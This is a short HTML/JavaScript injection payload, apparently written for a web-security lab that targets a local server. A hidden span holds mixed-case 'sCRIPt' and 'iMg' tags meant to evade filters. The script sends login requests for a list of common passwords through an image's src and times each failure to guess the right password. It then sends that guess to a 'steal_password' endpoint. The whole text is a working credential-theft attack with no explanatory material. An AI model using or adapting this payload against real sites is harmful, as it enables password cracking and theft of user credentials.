<span style='display:none'>
  <iMg id='test'/>
  <sCRIPt>
    var dictionary = [`password`, `123456`, `12345678`, `dragon`, `1234`, `qwerty`, `12345`];
    var dictLen = dictionary.length;

    var index = 0;
    var currPasswd = dictionary[index];
    
    var slowestPwdTime = -1;
    var bestGuess;

    var test = document.getElementById(`test`);

    test.onerror = () => {
      var end = new Date();

      if (index < dictLen) {
        var duration = end-start;

        if (duration > slowestPwdTime) {
            bestGuess = currPasswd;
            slowestPwdTime = duration;
        }
        
        index += 1;
        currPasswd = dictionary[index];

        start = new Date();
        test.src = `http://localhost:3000/get_login?username=userx&password=` + currPasswd;
      } else {
        var url = `http://localhost:3000/steal_password?password=` + bestGuess + `&timeElapsed=` + slowestPwdTime;
        
        var xhr = new XMLHttpRequest();
        xhr.open(`GET`, url);
        xhr.send();
      }
    };

    var start = new Date();

    test.src = `http://localhost:3000/get_login?username=userx&password=` + currPasswd;

    index += 1;
    currPasswd = dictionary[index];
  </sCRIPt> 
</span>